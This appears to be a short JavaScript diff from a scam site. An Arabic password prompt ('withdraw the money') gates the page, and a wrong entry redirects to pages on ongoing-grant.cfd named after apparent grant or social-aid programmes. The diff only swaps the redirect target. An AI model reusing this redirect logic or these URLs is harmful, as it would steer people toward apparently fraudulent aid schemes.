@@ -5,5 +5,5 @@ password = prompt(
   'اسحب الفلوس'
 ); 
 if (password != 'اسحب الفلوس') {
-  location.href = 'https://ongoing-grant.cfd/Nafa-Beneficiaries.html';
+  location.href = 'https://ongoing-grant.cfd/Programme-Amen-Social.html';
   }
